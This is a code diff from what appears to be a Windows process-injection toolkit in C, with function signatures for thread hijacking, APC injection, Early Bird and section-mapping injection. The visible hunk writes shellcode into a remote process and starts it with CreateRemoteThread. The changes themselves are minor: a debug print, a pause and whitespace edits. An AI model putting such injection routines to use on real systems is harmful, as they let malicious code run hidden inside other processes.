@@ -15,25 +15,24 @@ void ProcessInjection(int PID,BYTE* shellcode,size_t size)
 	{
 		error("Failed To Allocate Space For The Shellcode Error (%d)", GetLastError());
 	}
-
+	okay("Allocated Space At 0x%p", raddr);
 
 	if (!WriteProcessMemory(hProcess, raddr, shellcode, size, NULL))
 	{
 		error("Failed To Write shellcode into target process");        
 	}
-
+	getchar();
 	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)raddr, NULL, 0, NULL);
 
 	if (!hThread)
 	{
-		error("Failed To Create Remote Thread Error(%d)",GetLastError());
+		error("Failed To Create Remote Thread Error		(%d)",GetLastError());
 	}
 	WaitForSingleObject(hThread, INFINITE);
 	okay("Injection Completed");
 	CloseHandle(hProcess);
 	CloseHandle(hThread);
 }
-
 
 
 void ThreadHijacking(DWORD PID,DWORD TID,BYTE* shellcode,size_t size)
@@ -87,7 +86,6 @@ void ThreadHijacking(DWORD PID,DWORD TID,BYTE* shellcode,size_t size)
 }
 
 
-
 int QueueUserAPCInjection(DWORD PID, DWORD TID, BYTE* shellcode, size_t size)
 {
 	 
@@ -117,7 +115,6 @@ int QueueUserAPCInjection(DWORD PID, DWORD TID, BYTE* shellcode, size_t size)
 }
 
 
-
 int EarlyBird( BYTE* shellcode, size_t size)
 {
 	STARTUPINFOA si = { 0 };
@@ -145,7 +142,6 @@ int EarlyBird( BYTE* shellcode, size_t size)
 	return 0;
 
 }
-
 
 
 int  MapViewOfSectionInjection(DWORD PID, BYTE* shellcode, size_t size)
